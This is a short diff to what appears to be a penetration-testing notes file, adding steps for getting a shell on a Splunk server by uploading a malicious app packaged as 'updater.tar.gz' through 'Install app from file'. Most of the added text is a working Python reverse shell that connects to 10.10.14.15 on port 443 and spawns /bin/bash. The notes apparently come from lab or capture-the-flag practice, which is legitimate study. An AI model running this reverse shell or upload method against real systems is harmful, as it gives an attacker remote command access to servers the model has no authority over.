@@ -398,4 +398,16 @@ println("${cmd.text}");
 tar -cvzf updater.tar.gz splunk_shell/
 ```
 * next step is to choose `Install app from file` and upload the application
-* start listener before upload
+	* start listener before upload
+* On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`
+* rev.py for linux:
+```python
+import sys,socket,os,pty
+
+ip="10.10.14.15"
+port="443"
+s=socket.socket()
+s.connect((ip,int(port)))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn('/bin/bash')
+```
